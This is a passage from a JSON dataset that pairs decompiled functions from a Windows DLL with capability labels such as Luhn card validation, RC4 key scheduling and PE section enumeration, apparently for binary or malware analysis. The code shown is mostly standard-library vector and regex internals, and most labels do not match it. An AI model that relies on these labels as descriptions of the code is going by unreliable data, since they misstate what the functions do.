        "decompiled_code": "\nint32_t * __thiscall fcn.10005e50(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    \n    if (param_1 != param_2) {\n        iVar1 = *param_2;\n        iVar6 = param_2[1];\n        if (iVar1 == iVar6) {\n            param_1[1] = *param_1;\n            return param_1;\n        }\n        iVar2 = *param_1;\n        uVar5 = param_1[1] - iVar2 >> 2;\n        uVar7 = iVar6 - iVar1 >> 2;\n        if (uVar7 <= uVar5) {\n            fcn.1000bc90(iVar2, iVar1, iVar6 - iVar1);\n            param_1[1] = *param_1 + (param_2[1] - *param_2 >> 2) * 4;\n            return param_1;\n        }\n        uVar4 = param_1[2] - iVar2 >> 2;\n        if (uVar7 <= uVar4) {\n            iVar6 = iVar1 + uVar5 * 4;\n            fcn.1000bc90(iVar2, iVar1, iVar6 - iVar1);\n            iVar1 = param_2[1];\n            iVar2 = param_1[1];\n            fcn.1000bc90(iVar2, iVar6, iVar1 - iVar6);\n            param_1[1] = (iVar1 - iVar6) + iVar2;\n            return param_1;\n        }\n        if (iVar2 != 0) {\n            fcn.10003af0(iVar2, uVar4);\n        }\n        cVar3 = fcn.10003bd0(param_2[1] - *param_2 >> 2);\n        if (cVar3 != '\\0') {\n            iVar1 = *param_1;\n            iVar6 = param_2[1] - *param_2;\n            fcn.1000bc90(iVar1, *param_2, iVar6);\n            param_1[1] = iVar6 + iVar1;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 530
    },
    "10005f40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.10005f40(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    uVar4 = param_2[1] - *param_2 >> 2;\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    if (uVar4 != 0) {\n        if (0x3fffffff < uVar4) {\n            fcn.1000a1f1(\"vector<T> too long\");\n            pcVar1 = swi(3);\n            piVar3 = (*pcVar1)();\n            return piVar3;\n        }\n        iVar2 = fcn.10003c30(uVar4);\n        *param_1 = iVar2;\n        param_1[1] = iVar2;\n        param_1[2] = *param_1 + uVar4 * 4;\n        iVar5 = param_2[1] - *param_2;\n        iVar2 = *param_1;\n        fcn.1000bc90(iVar2, *param_2, iVar5);\n        param_1[1] = iVar5 + iVar2;\n    }\n    return param_1;\n}\n",
        "token_count": 352
    },
    "10006760": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.10006760(int32_t *param_1)\n\n{\n    uint16_t *puVar1;\n    \n    puVar1 = *param_1 + 2;\n    if ((puVar1 != param_1[2]) &&\n       ((((param_1[0x14] & 8U) == 0 && ((*puVar1 == 0x28 || (*puVar1 == 0x29)))) ||\n        (((param_1[0x14] & 0x10U) == 0 && ((puVar1 = *puVar1,  puVar1 == 0x7b || (puVar1 == 0x7d)))))))) {\n        return CONCAT31(puVar1 >> 8, 1);\n    }\n    return puVar1 & 0xffffff00;\n}\n",
        "token_count": 182
    },
    "100067a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.100067a0(int16_t **param_1)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    char cVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    uint unaff_ESI;\n    bool bVar6;\n    \n    piVar5 = *param_1;\n    if (piVar5 != param_1[2]) {\n        if (((*piVar5 == 0x5c) && (piVar5 = piVar5 + 1,  piVar5 != param_1[2])) &&\n           ((((param_1[0x14] & 8) == 0 && ((*piVar5 == 0x28 || (*piVar5 == 0x29)))) ||\n            (((param_1[0x14] & 0x10) == 0 && ((*piVar5 == 0x7b || (*piVar5 == 0x7d)))))))) {\n            *param_1 = piVar5;\n        }\n        *param_1 = *param_1 + 1;\n    }\n    if (*param_1 == param_1[2]) {\n        param_1[0x13] = 0xffffffff;\n        *(param_1 + 0x12) = 0xffff;\n    }\n    else {\n        iVar1 = **param_1;\n        *(param_1 + 0x12) = iVar1;\n        iVar4 = fcn.1000cfb0(\"()$^.*+?[]|\\\\-{},:=!\\n\\r\\b\", iVar1, unaff_ESI);\n        if (iVar4 == 0) {\n            piVar5 = NULL;\n        }\n        else {\n            piVar5 = *(param_1 + 0x12);\n        }\n        param_1[0x13] = piVar5;\n    }\n    switch(*(param_1 + 0x12)) {\n    case 10:\n        if ((*(param_1 + 0x14) & 4) == 0) {\n            return;\n        }\n        if (param_1[4] != NULL) {\n            return;\n        }\n        param_1[0x13] = 0x7c;\n        return;\n    default:\n        goto code_r0x100055a9;\n    case 0x24:\n        if ((param_1[0x14] & 0x2000000) == 0) {\n            return;\n        }\n        if (*param_1 + 1 == param_1[2]) {\n            return;\n        }\n        if ((*param_1)[1] == 10) {\n            return;\n        }\n        param_1[0x13] = NULL;\n        return;\n    case 0x28:\n    case 0x29:\n        bVar6 = (*(param_1 + 0x14) & 8) == 0;\n        break;\n    case 0x2a:\n        if ((param_1[0x14] & 0x4000000) == 0) {\n            return;\n        }\n        cVar3 = fcn.10006a70();\n        if (cVar3 == '\\0') {\n            return;\n        }\n        param_1[0x13] = NULL;\n        return;\n    case 0x2b:\n    case 0x3f:\n        bVar6 = (*(param_1 + 0x14) & 1) == 0;\n        break;\n    case 0x5c:\n        cVar3 = fcn.10006760();\n        if (cVar3 == '\\0') {\n            return;\n        }\n        uVar2 = (*param_1)[1];\n        *(param_1 + 0x12) = uVar2;\n        param_1[0x13] = uVar2;\n        return;\n    case 0x5e:\n        if ((param_1[0x14] & 0x2000000) == 0) {\n            return;\n        }\n        cVar3 = fcn.10006a70();\n        bVar6 = cVar3 == '\\0';\n        break;\n    case 0x7b:\n    case 0x7d:\n        bVar6 = (*(param_1 + 0x14) & 0x10) == 0;\n        break;\n    case 0x7c:\n        bVar6 = (*(param_1 + 0x14) & 2) == 0;\n    }\n    if (bVar6) {\n        param_1[0x13] = NULL;\n    }\ncode_r0x100055a9:\n    return;\n}\n",
        "token_count": 1020
    },
    "10006ab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.10006ab0(int32_t param_1)\n\n{\n    code *pcVar1;\n    code **ppcVar2;\n    \n    ppcVar2 = fcn.1000ac95(0x14);\n    ppcVar2[4] = NULL;\n    *ppcVar2 = vtable.std::_Node_base.0;\n    ppcVar2[1] = 0x8;\n    ppcVar2[2] = NULL;\n    ppcVar2[3] = NULL;\n    ppcVar2[4] = *(param_1 + 4);\n    pcVar1 = *(*(param_1 + 4) + 0xc);\n    if (pcVar1 != NULL) {\n        ppcVar2[3] = pcVar1;\n        *(*(*(param_1 + 4) + 0xc) + 0x10) = ppcVar2;\n    }\n    *(*(param_1 + 4) + 0xc) = ppcVar2;\n    *(param_1 + 4) = ppcVar2;\n    return ppcVar2;\n}\n",
        "token_count": 249
    },
    "10006b10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.10006b10(int32_t param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    code **ppcVar2;\n    code **ppcVar3;\n    \n    ppcVar2 = fcn.1000ac95(0x14);\n    ppcVar2[4] = NULL;\n    ppcVar2[1] = 0x11;\n    ppcVar2[2] = NULL;\n    ppcVar2[3] = NULL;\n    *ppcVar2 = vtable.std::_Node_endif.0;\n    ppcVar2[4] = *(param_1 + 4);\n    pcVar1 = *(*(param_1 + 4) + 0xc);\n    if (pcVar1 != NULL) {\n        ppcVar2[3] = pcVar1;\n        *(*(*(param_1 + 4) + 0xc) + 0x10) = ppcVar2;\n    }\n    *(*(param_1 + 4) + 0xc) = ppcVar2;\n    *(param_1 + 4) = ppcVar2;\n    ppcVar3 = fcn.1000ac95(0x1c);\n    ppcVar3[5] = ppcVar2;\n    ppcVar3[1] = 0x10;\n    ppcVar3[2] = NULL;\n    ppcVar3[3] = NULL;\n    ppcVar3[4] = NULL;\n    *ppcVar3 = vtable.std::_Node_if.0;\n    ppcVar3[6] = NULL;\n    pcVar1 = *(param_2 + 0xc);\n    *(*(pcVar1 + 0x10) + 0xc) = ppcVar3;\n    ppcVar3[4] = *(pcVar1 + 0x10);\n    *(pcVar1 + 0x10) = ppcVar3;\n    ppcVar3[3] = pcVar1;\n    return ppcVar2;\n}\n",
        "token_count": 459
    },
    "10006c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __fastcall\nfcn.10006c60(uint *param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint32_t param_7)\n\n{\n    uint *puVar1;\n    \n    *param_1 = param_4;\n    if ((param_7 & 0x100) != 0) {\n        puVar1 = fcn.10007bc0(param_3, param_4, param_5, param_6, param_2);\n        *param_1 = *puVar1;\n        return param_1;\n    }\n    if ((param_7 & 0x800) != 0) {\n        puVar1 = fcn.10007c70(param_3, param_4, param_5, param_6, param_2);\n        *param_1 = *puVar1;\n        return param_1;\n    }\n    puVar1 = fcn.10007cd0(param_3, param_4, param_5, param_6, param_4);\n    *param_1 = *puVar1;\n    return param_1;\n}\n",
        "token_count": 255
    },
    "10006cf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint16_t ** __fastcall\nfcn.10006cf0(uint16_t **param_1, uint16_t *param_2, uint16_t *param_3, uint16_t *param_4, uint16_t *param_5, \n            int32_t param_6)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int16_t iVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    \n    puVar5 = param_3;\n    puVar6 = param_3;\n    if (param_3 != param_4) {\n        do {\n            puVar6 = puVar5;\n            if (param_2 == param_5) break;\n            uVar1 = *param_2;\n            puVar6 = puVar5 + 1;\n            pcVar2 = **(param_6 + 4);\n            if (pcVar2 == vtable.std::ctype_wchar_t_.0) {\n                iVar3 = fcn.1000a294(*puVar5, *(param_6 + 4) + 2);\n            }\n            else {\n                iVar3 = (**(pcVar2 + 0x20))(*puVar5);\n            }\n            pcVar2 = **(param_6 + 4);\n            if (pcVar2 == vtable.std::ctype_wchar_t_.0) {\n                iVar4 = fcn.1000a294(uVar1, *(param_6 + 4) + 2);\n            }\n            else {\n                iVar4 = (**(pcVar2 + 0x20))(uVar1);\n            }\n            param_2 = param_2 + 1;\n            if (iVar3 != iVar4) {\n                *param_1 = param_3;\n                return param_1;\n            }\n            puVar5 = puVar6;\n        } while (puVar6 != param_4);\n    }\n    if (param_2 == param_5) {\n        param_3 = puVar6;\n    }\n    *param_1 = param_3;\n    return param_1;\n}\n",
        "token_count": 466
    },
    "10006db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall\nfcn.10006db0(uint16_t **param_1, uint16_t *param_2, uint16_t **param_3, uint16_t **param_4, uint16_t *param_5)\n\n{\n    char cVar1;\n    uint16_t **unaff_EBP;\n    uint16_t **ppuVar2;\n    uint16_t **unaff_retaddr;\n    \n    ppuVar2 = param_3;\n    if (param_3 != param_4) {\n        do {\n            if (param_2 == param_5) break;\n            cVar1 = fcn.10007050(*ppuVar2, *param_2);\n            param_2 = param_2 + 1;\n            if (cVar1 == '\\0') {\n                *unaff_EBP = param_3;\n                return;\n            }\n            ppuVar2 = param_1;\n        } while (param_1 != unaff_retaddr);\n    }\n    if (param_2 == param_5) {\n        param_3 = ppuVar2;\n    }\n    *param_1 = param_3;\n    return;\n}\n",
        "token_count": 251
    },
    "10006e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10006e20(int16_t **param_1, int16_t *param_2, int16_t *param_3, int16_t *param_4, int16_t *param_5)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    \n    piVar2 = param_3;\n    piVar3 = param_3;\n    if (param_3 != param_4) {\n        do {\n            piVar3 = piVar2;\n            if (param_2 == param_5) break;\n            iVar1 = *param_2;\n            piVar3 = piVar2 + 1;\n            param_2 = param_2 + 1;\n            if (*piVar2 != iVar1) {\n                *param_1 = param_3;\n                return;\n            }\n            piVar2 = piVar3;\n        } while (piVar3 != param_4);\n    }\n    if (param_2 == param_5) {\n        param_3 = piVar3;\n    }\n    *param_1 = param_3;\n    return;\n}\n",
        "token_count": 252
    },
    "10006fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10006fe0(ulong *param_1, int32_t param_2)\n\n{\n    if (param_2 != 0) {\n        do {\n            if (param_1 != NULL) {\n                *param_1 = 0;\n                *param_1 = 0;\n                *(param_1 + 4) = 0;\n            }\n            param_1 = param_1 + 1;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "10007010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10007010(uint *param_1, int32_t param_2)\n\n{\n    if (param_2 != 0) {\n        do {\n            if (param_1 != NULL) {\n                *param_1 = 0;\n                param_1[1] = 0;\n                *(param_1 + 2) = 0;\n            }\n            param_1 = param_1 + 3;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "10007150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.10007150(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint extraout_ECX;\n    uint32_t uVar4;\n    uint unaff_retaddr;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    uVar4 = param_2[1] - *param_2 >> 3;\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    if (uVar4 != 0) {\n        if (0x1fffffff < uVar4) {\n            fcn.1000a1f1(\"vector<T> too long\");\n            pcVar1 = swi(3);\n            piVar3 = (*pcVar1)();\n            return piVar3;\n        }\n        iVar2 = fcn.10004d30(uVar4);\n        *param_1 = iVar2;\n        param_1[1] = iVar2;\n        param_1[2] = *param_1 + uVar4 * 8;\n        iVar2 = fcn.100086c0(*param_1, extraout_ECX, unaff_retaddr, extraout_ECX);\n        param_1[1] = iVar2;\n    }\n    return param_1;\n}\n",
        "token_count": 334
    },
    "100071e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.100071e0(int16_t **param_1, int16_t **param_2)\n\n{\n    int16_t **ppiVar1;\n    int16_t **ppiVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    \n    ppiVar1 = param_2 + 4;\n    if (0x7 < param_2[5]) {\n        param_2 = *param_2;\n    }\n    ppiVar2 = param_1 + 4;\n    if (0x7 < param_1[5]) {\n        param_1 = *param_1;\n    }\n    piVar3 = *ppiVar1;\n    piVar4 = *ppiVar2;\n    piVar6 = piVar3;\n    if (piVar4 < piVar3) {\n        piVar6 = piVar4;\n    }\n    do {\n        if (piVar6 == NULL) {\n            uVar5 = 0;\ncode_r0x1000720e:\n            if (uVar5 == 0) {\n                if (piVar4 < piVar3) {\n                    return 0xffffffff;\n                }\n                uVar5 = piVar3 < piVar4;\n            }\n            return uVar5;\n        }\n        if (*param_1 != *param_2) {\n            uVar5 = (-(*param_1 < *param_2) & 0xfffffffe) + 1;\n            goto code_r0x1000720e;\n        }\n        param_1 = param_1 + 2;\n        param_2 = param_2 + 2;\n        piVar6 = piVar6 + -1;\n    } while( true );\n}\n",
        "token_count": 394
    },
    "10007250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10007250(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar1 = *param_1;\n    if (uVar1 == 0) {\n        return;\n    }\n    uVar3 = param_1[2] - uVar1 >> 1;\n    if (uVar3 < 0x80000000) {\n        uVar4 = uVar1;\n        if (uVar3 * 2 < 0x1000) {\ncode_r0x1000728a:\n            fcn.1000acc8(uVar4);\n            *param_1 = 0;\n            param_1[1] = 0;\n            param_1[2] = 0;\n            return;\n        }\n        if ((uVar1 & 0x1f) != 0) goto code_r0x100072ae;\n        uVar4 = *(uVar1 - 4);\n        if (uVar1 <= uVar4) goto code_r0x100072b3;\n        if (3 < uVar1 - uVar4) {\n            if (uVar1 - uVar4 < 0x24) goto code_r0x1000728a;\n            goto code_r0x100072bd;\n        }\n    }\n    else {\n        fcn.10010ddf();\ncode_r0x100072ae:\n        fcn.10010ddf();\ncode_r0x100072b3:\n        fcn.10010ddf();\n    }\n    fcn.10010ddf();\ncode_r0x100072bd:\n    fcn.10010ddf();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 398
    },
    "10007660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10007660(int16_t **param_1, int16_t *param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int16_t *piVar2;\n    \n    if (param_1[0x13] != param_2) {\n        fcn.1000a231(param_3);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    piVar2 = *param_1;\n    if (piVar2 != param_1[2]) {\n        if (((*piVar2 == 0x5c) && (piVar2 = piVar2 + 1,  piVar2 != param_1[2])) &&\n           ((((param_1[0x14] & 8) == 0 && ((*piVar2 == 0x28 || (*piVar2 == 0x29)))) ||\n            (((param_1[0x14] & 0x10) == 0 && ((*piVar2 == 0x7b || (*piVar2 == 0x7d)))))))) {\n            *param_1 = piVar2;\n        }\n        *param_1 = *param_1 + 1;\n    }\n    fcn.100054a0();\n    return;\n}\n",
        "token_count": 287
    },
    "100079f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.100079f0(int32_t param_1)\n\n{\n    code *pcVar1;\n    code **ppcVar2;\n    \n    ppcVar2 = fcn.1000ac95(0x14);\n    ppcVar2[4] = NULL;\n    *ppcVar2 = vtable.std::_Node_base.0;\n    ppcVar2[1] = 0x2;\n    ppcVar2[2] = NULL;\n    ppcVar2[3] = NULL;\n    ppcVar2[4] = *(param_1 + 4);\n    pcVar1 = *(*(param_1 + 4) + 0xc);\n    if (pcVar1 != NULL) {\n        ppcVar2[3] = pcVar1;\n        *(*(*(param_1 + 4) + 0xc) + 0x10) = ppcVar2;\n    }\n    *(*(param_1 + 4) + 0xc) = ppcVar2;\n    *(param_1 + 4) = ppcVar2;\n    return;\n}\n",
        "token_count": 244
    },
    "10007a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10007a50(int32_t param_1)\n\n{\n    code *pcVar1;\n    code **ppcVar2;\n    \n    ppcVar2 = fcn.1000ac95(0x14);\n    ppcVar2[4] = NULL;\n    *ppcVar2 = vtable.std::_Node_base.0;\n    ppcVar2[1] = 0x3;\n    ppcVar2[2] = NULL;\n    ppcVar2[3] = NULL;\n    ppcVar2[4] = *(param_1 + 4);\n    pcVar1 = *(*(param_1 + 4) + 0xc);\n    if (pcVar1 != NULL) {\n        ppcVar2[3] = pcVar1;\n        *(*(*(param_1 + 4) + 0xc) + 0x10) = ppcVar2;\n    }\n    *(*(param_1 + 4) + 0xc) = ppcVar2;\n    *(param_1 + 4) = ppcVar2;\n    return;\n}\n",
        "token_count": 244
    },
    "10007ab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10007ab0(int32_t param_1)\n\n{\n    code *pcVar1;\n    code **ppcVar2;\n    \n    ppcVar2 = fcn.1000ac95(0x14);\n    ppcVar2[4] = NULL;\n    *ppcVar2 = vtable.std::_Node_base.0;\n    ppcVar2[1] = 0x4;\n    ppcVar2[2] = NULL;\n    ppcVar2[3] = NULL;\n    ppcVar2[4] = *(param_1 + 4);\n    pcVar1 = *(*(param_1 + 4) + 0xc);\n    if (pcVar1 != NULL) {\n        ppcVar2[3] = pcVar1;\n        *(*(*(param_1 + 4) + 0xc) + 0x10) = ppcVar2;\n    }\n    *(*(param_1 + 4) + 0xc) = ppcVar2;\n    *(param_1 + 4) = ppcVar2;\n    return;\n}\n",
        "token_count": 244
    },
    "10007bc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint16_t ** __thiscall\nfcn.10007bc0(uint16_t **param_1, uint16_t *param_2, uint16_t *param_3, uint16_t *param_4, uint16_t *param_5, \n            int32_t param_6)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int16_t iVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint16_t *puVar7;\n    bool bVar8;\n    \n    puVar5 = param_2;\n    puVar6 = param_2;\n    if (param_2 != param_3) {\n        do {\n            bVar8 = param_4 == param_5;\n            puVar6 = puVar5;\n            if (bVar8) goto code_r0x10007c4c;\n            puVar6 = puVar5 + 1;\n            puVar7 = param_4 + 1;\n            uVar1 = *param_4;\n            pcVar2 = **(param_6 + 4);\n            if (pcVar2 == vtable.std::ctype_wchar_t_.0) {\n                iVar3 = fcn.1000a294(*puVar5, *(param_6 + 4) + 2);\n            }\n            else {\n                iVar3 = (**(pcVar2 + 0x20))(*puVar5);\n            }\n            pcVar2 = **(param_6 + 4);\n            if (pcVar2 == vtable.std::ctype_wchar_t_.0) {\n                iVar4 = fcn.1000a294(uVar1, *(param_6 + 4) + 2);\n            }\n            else {\n                iVar4 = (**(pcVar2 + 0x20))(uVar1);\n            }\n            if (iVar3 != iVar4) goto code_r0x10007c4f;\n            puVar5 = puVar6;\n            param_4 = puVar7;\n        } while (puVar6 != param_3);\n    }\n    bVar8 = param_4 == param_5;\ncode_r0x10007c4c:\n    if (bVar8) {\n        param_2 = puVar6;\n    }\ncode_r0x10007c4f:\n    *param_1 = param_2;\n    return param_1;\n}\n",
        "token_count": 530
    },
    "10007c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint16_t ** __thiscall\nfcn.10007c70(uint16_t **param_1, uint16_t *param_2, uint16_t *param_3, uint16_t *param_4, uint16_t *param_5)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    uint16_t *unaff_ESI;\n    bool bVar5;\n    uint16_t *unaff_retaddr;\n    \n    puVar4 = param_2;\n    if (param_2 != param_3) {\n        do {\n            bVar5 = param_4 == param_5;\n            if (bVar5) goto code_r0x10007cc3;\n            puVar3 = param_4 + 1;\n            uVar1 = *puVar4;\n            puVar4 = unaff_ESI;\n            cVar2 = fcn.10007050(uVar1, *param_4);\n            if (cVar2 == '\\0') goto code_r0x10007cc6;\n            param_4 = puVar3;\n            unaff_ESI = puVar4;\n        } while (puVar4 != unaff_retaddr);\n    }\n    bVar5 = param_4 == param_5;\ncode_r0x10007cc3:\n    if (bVar5) {\n        param_2 = puVar4;\n    }\ncode_r0x10007cc6:\n    *param_1 = param_2;\n    return param_1;\n}\n",
        "token_count": 342
    },
    "10007cd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t ** __thiscall\nfcn.10007cd0(int16_t **param_1, int16_t *param_2, int16_t *param_3, int16_t *param_4, int16_t *param_5)\n\n{\n    int16_t *piVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    \n    piVar1 = param_2;\n    piVar2 = param_2;\n    piVar3 = param_4;\n    if (param_2 != param_3) {\n        do {\n            piVar2 = piVar1;\n            piVar3 = param_4;\n            if (param_4 == param_5) break;\n            piVar3 = param_4 + 1;\n            piVar2 = piVar1 + 1;\n            if (*piVar1 != *param_4) {\n                *param_1 = param_2;\n                return param_1;\n            }\n            piVar1 = piVar2;\n            param_4 = piVar3;\n        } while (piVar2 != param_3);\n    }\n    if (piVar3 == param_5) {\n        param_2 = piVar2;\n    }\n    *param_1 = param_2;\n    return param_1;\n}\n",
        "token_count": 284
    },
    "100081c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.100081c0(int32_t param_1)\n\n{\n    code *pcVar1;\n    code **ppcVar2;\n    \n    ppcVar2 = fcn.1000ac95(0x14);\n    ppcVar2[4] = NULL;\n    *ppcVar2 = vtable.std::_Node_base.0;\n    ppcVar2[1] = 0x8;\n    ppcVar2[2] = NULL;\n    ppcVar2[3] = NULL;\n    ppcVar2[4] = *(param_1 + 0x28);\n    pcVar1 = *(*(param_1 + 0x28) + 0xc);\n    if (pcVar1 != NULL) {\n        ppcVar2[3] = pcVar1;\n        *(*(*(param_1 + 0x28) + 0xc) + 0x10) = ppcVar2;\n    }\n    *(*(param_1 + 0x28) + 0xc) = ppcVar2;\n    *(param_1 + 0x28) = ppcVar2;\n    fcn.10005650();\n    fcn.100057f0(ppcVar2);\n    return;\n}\n",
        "token_count": 275
    },
    "10008270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10008270(int32_t param_1)\n\n{\n    code *pcVar1;\n    code **ppcVar2;\n    \n    ppcVar2 = fcn.1000ac95(0x2c);\n    ppcVar2[4] = NULL;\n    ppcVar2[1] = 0x7;\n    ppcVar2[2] = NULL;\n    ppcVar2[3] = NULL;\n    *ppcVar2 = vtable.std::_Node_class_wchar_t__class_std::regex_traits_wchar_t__.0;\n    ppcVar2[5] = NULL;\n    ppcVar2[6] = NULL;\n    ppcVar2[7] = NULL;\n    ppcVar2[8] = NULL;\n    *(ppcVar2 + 9) = 0;\n    ppcVar2[10] = NULL;\n    ppcVar2[4] = *(param_1 + 4);\n    pcVar1 = *(*(param_1 + 4) + 0xc);\n    if (pcVar1 != NULL) {\n        ppcVar2[3] = pcVar1;\n        *(*(*(param_1 + 4) + 0xc) + 0x10) = ppcVar2;\n    }\n    *(*(param_1 + 4) + 0xc) = ppcVar2;\n    *(param_1 + 4) = ppcVar2;\n    return;\n}\n",
        "token_count": 325
    },
    "10008300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10008300(int32_t param_1, code *param_2)\n\n{\n    code *pcVar1;\n    code **ppcVar2;\n    \n    ppcVar2 = fcn.1000ac95(0x18);\n    ppcVar2[4] = NULL;\n    ppcVar2[1] = 0xf;\n    ppcVar2[2] = NULL;\n    ppcVar2[3] = NULL;\n    *ppcVar2 = vtable.std::_Node_back.0;\n    ppcVar2[5] = param_2;\n    ppcVar2[4] = *(param_1 + 4);\n    pcVar1 = *(*(param_1 + 4) + 0xc);\n    if (pcVar1 != NULL) {\n        ppcVar2[3] = pcVar1;\n        *(*(*(param_1 + 4) + 0xc) + 0x10) = ppcVar2;\n    }\n    *(*(param_1 + 4) + 0xc) = ppcVar2;\n    *(param_1 + 4) = ppcVar2;\n    return;\n}\n",
        "token_count": 262
    },
    "10008640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
